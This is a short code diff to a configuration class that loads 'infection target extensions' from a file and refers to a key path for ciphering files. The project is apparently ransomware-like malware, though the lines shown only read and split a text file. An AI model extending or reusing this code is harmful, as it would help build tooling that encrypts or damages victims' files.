@@ -25,7 +25,11 @@ class Configlibrary:
 
     def get_infection_extensions(self):
         """function returns the infection target extensions"""
-        return self.config['infection']['extensions']
+        extensions_list = []
+        with open(self.config['infection']['extensions'], 'rb') as extensions_file:
+            extensions_str = extensions_file.read().decode("utf-8")
+        extensions_list = extensions_str.split('\r\n.')
+        return extensions_list
 
     def get_infection_key(self):
         """function returns the key path to cipher files"""
